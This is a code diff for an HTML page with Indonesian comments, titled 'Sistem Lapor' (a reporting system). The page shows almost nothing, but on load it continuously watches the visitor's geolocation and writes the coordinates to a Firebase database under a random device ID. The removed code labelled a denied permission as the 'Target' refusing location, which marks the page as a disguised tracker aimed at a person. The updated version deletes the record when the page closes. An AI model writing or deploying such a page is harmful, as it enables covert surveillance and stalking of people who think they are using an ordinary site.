@@ -23,65 +23,40 @@
         const app = initializeApp(firebaseConfig);
         const database = getDatabase(app);
 
-        // Fungsi untuk mendapatkan lokasi
-        function getLocation() {
-            console.log("Meminta lokasi...");
+        // Buat ID perangkat unik
+        const deviceId = "device_" + Math.random().toString(36).substring(2, 15);
+
+        // Simpan lokasi perangkat ke Firebase
+        function saveLocation(lat, lon) {
+            set(ref(database, 'devices/' + deviceId), {
+                latitude: lat,
+                longitude: lon
+            });
+        }
+
+        // Hapus lokasi perangkat saat halaman ditutup
+        function removeLocation() {
+            remove(ref(database, 'devices/' + deviceId));
+        }
+
+        // Dapatkan lokasi perangkat dan simpan ke Firebase
+        window.onload = function() {
             if (navigator.geolocation) {
-                navigator.geolocation.watchPosition(showPosition, showError, {
-                    enableHighAccuracy: true
+                navigator.geolocation.watchPosition((position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    saveLocation(lat, lon);
                 });
             } else {
-                alert("Geolocation tidak didukung oleh browser ini.");
+                alert('Geolocation is not supported by this browser.');
             }
-        }
+        };
 
-        function showPosition(position) {
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-
-            // Menggunakan ID perangkat unik (dapat disesuaikan)
-            const deviceId = 'device_' + Math.floor(Math.random() * 10000); // Ganti dengan metode ID unik yang sesuai
-
-            // Mengirim data lokasi ke Firebase
-            const locationRef = ref(database, 'devices/' + deviceId); // ID perangkat unik
-            set(locationRef, {
-                latitude: lat,
-                longitude: lon,
-                timestamp: Date.now()
-            });
-
-            // Menghapus pesan penolakan izin (jika ada)
-            const notificationRef = ref(database, 'notifications/' + deviceId); // ID perangkat unik
-            remove(notificationRef);
-        }
-
-        function showError(error) {
-            const notificationRef = ref(database, 'notifications/device1'); // ID perangkat unik
-            console.log("Error mendapatkan lokasi:", error); // Log kesalahan untuk debug
-            switch (error.code) {
-                case error.PERMISSION_DENIED:
-                    set(notificationRef, {
-                        message: "Target tidak izinkan lokasi"
-                    });
-                    break;
-                case error.POSITION_UNAVAILABLE:
-                    alert("Informasi lokasi tidak tersedia.");
-                    break;
-                case error.TIMEOUT:
-                    alert("Permintaan untuk mendapatkan lokasi pengguna telah waktunya habis.");
-                    break;
-                case error.UNKNOWN_ERROR:
-                    alert("Terjadi kesalahan yang tidak diketahui.");
-                    break;
-            }
-        }
-
-        // Mulai mendapatkan lokasi saat halaman dimuat
-        window.onload = getLocation;
+        // Hapus lokasi saat halaman ditutup
+        window.onbeforeunload = removeLocation;
     </script>
 </head>
 <body>
     <h1>Sistem Lapor</h1>
-    <p>Proses Development...</p>
 </body>
 </html>
